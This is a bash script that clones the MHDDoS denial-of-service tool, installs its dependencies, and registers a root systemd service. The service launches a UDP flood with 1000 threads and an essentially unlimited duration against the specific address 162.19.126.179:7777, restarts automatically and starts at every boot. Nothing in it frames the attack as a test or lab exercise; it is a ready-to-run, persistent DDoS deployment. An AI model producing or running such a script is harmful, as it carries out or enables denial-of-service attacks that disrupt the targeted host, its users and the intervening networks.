# 1. Go to the home directory and ensure the folder exists
cd ~
if [ ! -d "MHDDoS" ]; then
    git clone https://github.com/MatrixTM/MHDDoS.git
fi
cd MHDDoS

# 2. Install requirements using the current folder's file
pip3 install --upgrade pip --break-system-packages
pip3 install -r requirements.txt --break-system-packages
pip3 install PyRoxy --break-system-packages

# 3. Create the service file using your CURRENT directory
# This prevents the "No such file" error by hardcoding the path where you are right now
cat <<EOF | sudo tee /etc/systemd/system/mhddos.service
[Unit]
Description=MHDDoS Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
User=root
WorkingDirectory=$(pwd)
Environment=PYTHONPATH=/usr/local/lib/python3.12/dist-packages
ExecStart=/usr/bin/python3 start.py UDP 162.19.126.179:7777 1000 99999999999
Restart=always
RestartSec=5s
RuntimeMaxSec=10min

[Install]
WantedBy=multi-user.target
EOF

# 4. Reload and Start
sudo systemctl daemon-reload
sudo systemctl enable mhddos.service
sudo systemctl restart mhddos.service

echo "------------------------------------------------"
echo "Setup complete in $(pwd)"
systemctl status mhddos.service
